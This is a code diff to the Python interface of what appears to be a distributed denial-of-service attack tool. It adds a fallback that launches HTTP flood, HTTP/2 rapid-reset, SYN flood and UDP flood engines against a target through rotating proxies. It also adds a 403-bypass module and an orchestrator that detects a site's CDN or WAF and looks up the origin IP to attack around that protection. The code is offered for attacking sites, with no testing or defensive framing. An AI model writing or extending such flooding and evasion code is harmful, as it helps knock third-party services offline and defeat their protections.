@@ -21,8 +21,12 @@ IS_WINDOWS = sys.platform == "win32"
 # Set UTF-8 encoding for Windows console
 if IS_WINDOWS:
     import codecs
-    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
-    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
+    try:
+        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
+        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
+    except AttributeError:
+        # stdout already wrapped, skip
+        pass
 
 from rich.console import Console
 from rich.table import Table
@@ -355,6 +359,7 @@ def toggle_bypass_features():
         "4": ("FlareSolverr", "flaresolverr"),
         "5": ("Origin Discovery", "origin_discovery"),
         "6": ("Browser Pool", "browser_pool"),
+        "7": ("403 Forbidden Bypass", "forbidden_bypass"),
     }
     while True:
         table = Table(title="BYPASS MODULE TOGGLES", box=box.HEAVY_EDGE, border_style="cyan",
@@ -368,7 +373,7 @@ def toggle_bypass_features():
         table.add_row("", "", "")
         table.add_row("[cyan]0[/]", "[bold]Back to Main Menu[/]", "")
         _RICH_CONSOLE.print(table)
-        ch = get_input(" [bold]Toggle module [1-6] or 0 to exit:[/] ").strip()
+        ch = get_input(" [bold]Toggle module [1-7] or 0 to exit:[/] ").strip()
         if ch == "0":
             break
         if ch in feature_names:
@@ -412,19 +417,100 @@ def build_go_args(target: str, duration: int, rps: int, method: str, threads: in
         args.extend(["-ja3", ja3])
     return args
 
+async def _run_python_fallback(target: str, duration: int, rps: int, method: str,
+                                threads: int, proxy_file: str, http2: bool,
+                                rapid_reset: bool, origin_ip: str,
+                                live_stats: dict) -> Dict:
+    """Python fallback for Go engine methods."""
+    host_header = target.replace("https://", "").replace("http://", "").split("/")[0]
+    proxy_url = ""
+    if proxy_file:
+        try:
+            with open(proxy_file) as f:
+                proxies = [l.strip() for l in f if l.strip()]
+                if proxies:
+                    import random
+                    proxy_url = random.choice(proxies)
+        except:
+            pass
+
+    if method in ("http-flood", "h2smuggle") or http2:
+        from core.attack.engines.h2_exhaust import run_h2_exhaust
+        start = time.time()
+        result = await run_h2_exhaust(
+            target=target, duration=duration, rps=rps,
+            host_header=host_header, proxy_url=proxy_url,
+            threads=max(threads or 10, 10), connections=4
+        )
+        elapsed = time.time() - start
+        final = {"total_requests": result.get("total", 0), "completed": result.get("ok", 0),
+                 "failed": result.get("fail", 0), "timeout": 0, "elapsed": elapsed}
+        if live_stats is not None:
+            live_stats["status"] = "done"
+            live_stats["stats"] = final
+        return final
+
+    if method == "rapid-reset" or rapid_reset:
+        from core.attack.engines.h2_exhaust import run_h2_exhaust
+        start = time.time()
+        result = await run_h2_exhaust(
+            target=target, duration=duration, rps=rps,
+            host_header=host_header, proxy_url=proxy_url,
+            threads=max(threads or 10, 10), connections=4,
+            rapid_reset=True
+        )
+        elapsed = time.time() - start
+        final = {"total_requests": result.get("total", 0), "completed": result.get("ok", 0),
+                 "failed": result.get("fail", 0), "timeout": 0, "elapsed": elapsed}
+        if live_stats is not None:
+            live_stats["status"] = "done"
+            live_stats["stats"] = final
+        return final
+
+    if method == "syn-flood":
+        from core.attack.engines.layer4_v5 import SynFloodV5
+        engine = SynFloodV5(target, duration=max(duration, 30))
+        engine.proxy_url = proxy_url
+        start = time.time()
+        result = await engine.start()
+        elapsed = time.time() - start
+        final = {"total_requests": result.get("packets_sent", 0), "completed": result.get("packets_sent", 0),
+                 "failed": 0, "timeout": 0, "elapsed": elapsed}
+        if live_stats is not None:
+            live_stats["status"] = "done"
+            live_stats["stats"] = final
+        return final
+
+    if method == "udp-flood":
+        from core.attack.engines.layer4_v5 import UdpFloodV5
+        engine = UdpFloodV5(target, duration=max(duration, 30))
+        engine.proxy_url = proxy_url
+        start = time.time()
+        result = await engine.start()
+        elapsed = time.time() - start
+        final = {"total_requests": result.get("packets_sent", 0), "completed": result.get("packets_sent", 0),
+                 "failed": 0, "timeout": 0, "elapsed": elapsed}
+        if live_stats is not None:
+            live_stats["status"] = "done"
+            live_stats["stats"] = final
+        return final
+
+    print(f" {c('y','[!]')} No Python fallback for method '{method}', returning empty")
+    return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": 0}
+
+
 async def run_go_engine(target: str, duration: int, rps: int, method: str = "http-flood",
                         threads: int = 0, proxy_file: str = "", http2: bool = False,
                         rapid_reset: bool = False, origin_ip: str = "",
                         live_stats: dict = None) -> Dict:
     """
-    Run Go engine. If live_stats dict is provided, updates it in real-time
-    with parsed [STATS] lines from Go output. Returns final result dict.
+    Run attack engine. Uses Go binary if available, falls back to pure Python.
+    If live_stats dict is provided, updates it in real-time. Returns result dict.
     """
     if not os.path.exists(GO_ENGINE):
-        print(f" {c('r','[-]')} Go engine not found: {GO_ENGINE}")
-        if live_stats is not None:
-            live_stats["status"] = "error"
-        return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0, "elapsed": 0}
+        print(f" {c('y','[!]')} Go engine not found, using Python fallback for {method}")
+        return await _run_python_fallback(target, duration, rps, method, threads,
+                                          proxy_file, http2, rapid_reset, origin_ip, live_stats)
 
     args = build_go_args(target, duration, rps, method, threads, proxy_file, http2, rapid_reset, origin_ip)
 
@@ -2976,7 +3062,7 @@ async def run_auto_mode(target: str, cfg: dict):
     try:
 
         # If bypass features are enabled, orchestrate with smart mode first
-        if bypass.get("waf_parsing_bypass") or bypass.get("http2_impersonation"):
+        if bypass.get("waf_parsing_bypass") or bypass.get("http2_impersonation") or bypass.get("forbidden_bypass"):
             _RICH_CONSOLE.print("[bold green][+][/] Smart bypass probing enabled - testing WAF evasion techniques...")
             try:
                 from core.bypass.orchestrator import execute_advanced_attack
@@ -2995,7 +3081,23 @@ async def run_auto_mode(target: str, cfg: dict):
                     _RICH_CONSOLE.print(f"[bold green][+][/] WAF probe: {probe_data.get('working_methods', 'completed')}")
             except Exception as e:
                 _RICH_CONSOLE.print(f"[bold yellow][!][/] Smart probe skipped: {e}")
-        
+
+        # 403 Forbidden bypass
+        if bypass.get("forbidden_bypass"):
+            try:
+                _RICH_CONSOLE.print("[bold green][+][/] Testing 403 bypass techniques...")
+                from core.bypass.modules.bypass_403 import bypass_403
+                fb_result = await bypass_403(target, timeout=8)
+                if fb_result.get("bypassed"):
+                    wm = fb_result.get("working_methods", [])
+                    _RICH_CONSOLE.print(f"[bold green][+][/] 403 bypassed! {len(wm)} methods working")
+                    for m in wm[:3]:
+                        _RICH_CONSOLE.print(f"  [dim]- {m.get('method','?')} {m.get('headers','')[:50]}[/]")
+                else:
+                    _RICH_CONSOLE.print("[bold yellow][!][/] 403 bypass: no working methods found")
+            except Exception as e:
+                _RICH_CONSOLE.print(f"[bold yellow][!][/] 403 bypass skipped: {e}")
+
         # Redirect to V3 (V2 merged into V3)
         _RICH_CONSOLE.print(f"\n[bold cyan][*][/] Using Auto Mode V3 engine (V2 merged into V3)")
         from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
@@ -3466,6 +3568,32 @@ async def _module_dispatch(module_func, multi_func, cfg, label="Target URL"):
                 return False
             if label != "Target IP/Host" and not t.startswith(("http://", "https://")):
                 t = "https://" + t
+
+            # Orchestrator: auto-detect CDN/WAF + origin bypass
+            if label != "Target IP/Host":
+                try:
+                    from core.bypass.orchestrator import BypassOrchestrator
+                    orch = BypassOrchestrator(timeout=10)
+                    cfg["bypass_result"] = await orch.orchestrate(t)
+                    br = cfg["bypass_result"]
+                    if br.get("detected_cdn"):
+                        print(f" {c('y','[!]')} CDN detected: {c('w', br['detected_cdn'])}")
+                    if br.get("detected_waf"):
+                        print(f" {c('y','[!]')} WAF detected: {c('w', ', '.join(br['detected_waf']))}")
+                        if "Fastly_412" in br.get("detected_waf", []):
+                            print(f" {c('g','[+]')} Fastly 412 bypass: curl_cffi Chrome TLS fingerprinting")
+                    if br.get("origin_ip"):
+                        print(f" {c('g','[+]')} Origin IP bypass: {c('w', br['origin_ip'])}")
+                    else:
+                        print(f" {c('y','[!]')} No origin IP found — attacking through CDN")
+                except Exception as e:
+                    import traceback as _tb
+                    print(f" {c('r','[-]')} Orchestrator error: {e}")
+                    _tb.print_exc()
+                    cfg["bypass_result"] = {}
+            else:
+                cfg["bypass_result"] = {}
+
             await module_func(t, cfg)
             return True
     except KeyboardInterrupt:
